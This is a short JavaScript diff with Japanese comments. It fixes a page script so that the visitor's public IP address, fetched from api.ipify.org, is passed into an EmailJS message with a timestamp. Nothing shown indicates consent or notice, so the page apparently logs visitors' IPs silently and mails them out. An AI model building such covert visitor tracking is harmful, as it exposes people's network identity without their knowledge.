@@ -19,14 +19,14 @@
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                sendIpViaEmail();
+                sendIpViaEmail(data.ip);
             })
             .catch(error => {
                 console.error('IP取得エラー:', error);
             });
 
         // EmailJSでIPを送信
-        function sendIpViaEmail() {
+        function sendIpViaEmail(ip) {
             const templateParams = {
                 ip: ip,
                 timestamp: new Date().toISOString()
